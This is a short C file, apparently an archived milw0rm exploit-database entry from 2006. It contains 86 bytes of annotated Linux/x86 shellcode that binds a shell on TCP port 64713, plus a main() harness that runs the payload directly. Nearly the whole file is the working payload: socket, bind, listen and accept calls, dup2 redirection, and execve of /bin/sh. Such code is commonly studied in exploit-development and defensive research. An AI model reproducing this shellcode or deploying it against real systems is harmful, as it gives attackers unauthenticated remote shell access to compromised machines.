/*
 * linux-x86-portbind.c - portbind shellcode 86 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>
 *
 * portbind shellcode that bind()'s a shell on port 64713/tcp
 *
 */

char shellcode[] =

  /* socket(AF_INET, SOCK_STREAM, 0) */

  "\x6a\x66"			// push   $0x66
  "\x58"			// pop    %eax
  "\x6a\x01"			// push   $0x1
  "\x5b"			// pop    %ebx
  "\x99"			// cltd
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x6a\x02"			// push   $0x2
  "\x89\xe1"			// mov    %esp,%ecx
  "\xcd\x80"			// int    $0x80

  /* bind(s, server, sizeof(server)) */

  "\x52"			// push   %edx
  "\x66\x68\xfc\xc9"		// pushw  $0xc9fc  // PORT = 64713
  "\x66\x6a\x02"		// pushw  $0x2
  "\x89\xe1"			// mov    $esp,%ecx
  "\x6a\x10"			// push   $0x10
  "\x51"			// push   %ecx
  "\x50"			// push   %eax
  "\x89\xe1"			// mov    %esp,%ecx
  "\x89\xc6"			// mov    %eax,%esi
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  /* listen(s, anything) */

  "\xb0\x66"			// mov    $0x66,%al
  "\xd1\xe3"			// shl    %ebx
  "\xcd\x80"			// int    $0x80

  /* accept(s, 0, 0) */

  "\x52"			// push   %edx
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  "\x93"			// xchg   %eax,%ebx

  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */

  "\x6a\x02"			// push   $0x2
  "\x59"			// pop    %ecx

  "\xb0\x3f"			// mov    $0x3f,%al
  "\xcd\x80"			// int    $0x80
  "\x49"			// dec    %ecx
  "\x79\xf9"			// jns    dup_loop

  /* execve("/bin/sh", ["/bin/sh"], NULL) */

  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80

int main() {

        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}

// milw0rm.com [2006-04-06]